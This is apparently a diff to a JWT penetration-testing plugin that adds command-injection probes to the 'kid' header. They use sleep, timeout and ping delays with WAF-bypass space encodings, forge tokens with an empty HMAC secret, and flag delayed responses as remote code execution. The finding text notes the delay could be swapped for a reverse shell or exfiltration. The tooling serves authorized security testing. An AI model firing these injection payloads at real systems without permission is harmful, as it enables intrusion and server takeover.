@@ -1771,6 +1771,40 @@ var WEAK_KIDS = [
     description: "Empty kid with empty secret"
   }
 ];
+var DELAY_SECONDS = 3;
+var COMMAND_INJECTION_KIDS = [
+  // Linux `sleep 3` with different space-encoding techniques (filter/WAF bypass)
+  { kid: "x; sleep 3", os: "Linux", command: "sleep 3", spaceEncoding: "plain space" },
+  { kid: "x;sleep${IFS}3", os: "Linux", command: "sleep 3", spaceEncoding: "${IFS}" },
+  { kid: "x;sleep$IFS$93", os: "Linux", command: "sleep 3", spaceEncoding: "$IFS$9" },
+  { kid: "x;{sleep,3}", os: "Linux", command: "sleep 3", spaceEncoding: "brace expansion {,} (no space)" },
+  { kid: "x;sleep	3", os: "Linux", command: "sleep 3", spaceEncoding: "tab (\\t)" },
+  { kid: "x|sleep 3", os: "Linux", command: "sleep 3", spaceEncoding: "plain space (pipe separator)" },
+  { kid: "x`sleep 3`", os: "Linux", command: "sleep 3", spaceEncoding: "plain space (backtick subshell)" },
+  { kid: "x$(sleep 3)", os: "Linux", command: "sleep 3", spaceEncoding: "plain space ($() subshell)" },
+  // Windows delays: `timeout` and `ping` (each ~3s)
+  { kid: "x& timeout /t 3", os: "Windows", command: "timeout /t 3", spaceEncoding: "plain space (& separator)" },
+  { kid: "x& ping -n 4 127.0.0.1", os: "Windows", command: "ping -n 4 127.0.0.1 (~3s)", spaceEncoding: "plain space (& separator)" },
+  // Cross-platform: sleep runs on Linux; on Windows it fails and || falls through to timeout
+  { kid: "x; sleep 3 || timeout /t 3", os: "Linux/Windows", command: "sleep 3 || timeout /t 3", spaceEncoding: "plain space (|| fallback)" }
+];
+function buildCommandInjectionAttack(parsed, p) {
+  const alg = parsed.header.alg.startsWith("HS") ? parsed.header.alg : "HS256";
+  const header = { ...parsed.header, alg, kid: p.kid };
+  const jwt = signHMAC(header, parsed.payload, Buffer.from(""), alg);
+  return {
+    id: nanoid(),
+    technique: "kidInject",
+    techniqueName: `KID Injection \u2014 OS Command Injection (${p.os})`,
+    description: `Injects a kid containing an OS command that pauses for ${DELAY_SECONDS}s (${p.command}; space encoded as ${p.spaceEncoding}). If the server passes the kid into a shell during key lookup, the response is delayed ~${DELAY_SECONDS}s versus the baseline.`,
+    modifiedJWT: jwt,
+    timestamp: Date.now(),
+    hmacSecret: "",
+    injectedCommand: p.command,
+    spaceEncoding: p.spaceEncoding,
+    expectedDelayMs: DELAY_SECONDS * 1e3
+  };
+}
 function buildHSAttack(parsed, payload, category) {
   const alg = parsed.header.alg.startsWith("HS") ? parsed.header.alg : "HS256";
   const header = { ...parsed.header, alg, kid: payload.kid };
@@ -1798,6 +1832,9 @@ function buildKIDInjectionAttacks(parsed) {
   }
   for (const payload of WEAK_KIDS) {
     results.push(buildHSAttack(parsed, payload, "Weak KID"));
+  }
+  for (const payload of COMMAND_INJECTION_KIDS) {
+    results.push(buildCommandInjectionAttack(parsed, payload));
   }
   return results;
 }
@@ -2529,10 +2566,69 @@ ${repro}
       if (!sigValidated) return;
       for (const a of list) {
         if (a.infoOnly || a.error) continue;
+        if (a.expectedDelayMs !== void 0) continue;
         if (matchesBaseline(a)) await createBypassFinding(a);
       }
     };
     await runBypassFindings(attacks);
+    const createCommandInjectionFinding = async (a, baseMs) => {
+      const sent = sentById.get(a.id);
+      if (!sent?.request) return;
+      let kid = "";
+      try {
+        kid = parseJWT(a.modifiedJWT).header.kid ?? "";
+      } catch {
+      }
+      const added = (a.durationMs ?? 0) - baseMs;
+      const repro = buildReproCommand(a);
+      try {
+        await sdk.findings.create({
+          title: "Command Injection using JWT `kid`",
+          reporter: "JWT Attacker",
+          dedupeKey: `jwt-attacker:cmd-injection:${sent.request.getHost()}${sent.request.getPath()}`,
+          request: sent.request,
+          description: `**Command Injection using JWT \`kid\`.**
+
+The \`kid\` (Key ID) header was set to a value containing an OS command. The endpoint took ~${added}ms longer than the baseline request (${a.durationMs}ms vs ${baseMs}ms baseline), matching the injected ${a.expectedDelayMs}ms time delay \u2014 so the server executes the \`kid\` value in an OS shell during key lookup. This is OS command injection (remote code execution).
+
+**Injected command:**
+
+\`\`\`
+kid            = ${kid}
+delay command  = ${a.injectedCommand}
+space encoding = ${a.spaceEncoding}
+\`\`\`
+
+The time-delay command is only a safe proof; replace it with any payload (reverse shell, file read, data exfiltration) to run arbitrary commands on the server.
+
+` + (repro ? "**REPRODUCE WITH JWT_TOOL:**\n\n```\n" + repro + "\n```" : "")
+        });
+        sdk.api.send("jwt-key-recovery-progress", {
+          sessionId,
+          message: 'Finding created: "Command Injection using JWT `kid`".'
+        });
+      } catch (e) {
+        errors.push(`[finding] ${e.message}`);
+      }
+    };
+    const runCommandInjectionFindings = async (list) => {
+      const baseMs = baseline.durationMs;
+      if (baseMs === void 0) return;
+      const MIN_ADDED_MS = 2500;
+      const MIN_ABSOLUTE_MS = 2800;
+      for (const a of list) {
+        if (a.expectedDelayMs === void 0 || a.error || a.durationMs === void 0) continue;
+        const added = a.durationMs - baseMs;
+        if (added >= MIN_ADDED_MS && a.durationMs >= MIN_ABSOLUTE_MS) {
+          a.commandInjectionDetected = true;
+          a.baselineDurationMs = baseMs;
+          a.description += ` \u26A0 Response took ${a.durationMs}ms vs baseline ${baseMs}ms (+${added}ms \u2248 injected ${a.expectedDelayMs}ms) \u2014 command injection likely.`;
+          sdk.api.send("jwt-attack-result", { sessionId, result: a });
+          await createCommandInjectionFinding(a, baseMs);
+        }
+      }
+    };
+    if (cfg.enabledAttacks.kidInject) await runCommandInjectionFindings(attacks);
     if (sigValidated && tlsKey?.publicKeyPem) {
       const hit = attacks.find(
         (a) => a.keyPem === tlsKey.publicKeyPem && !a.infoOnly && !a.error && matchesBaseline(a)
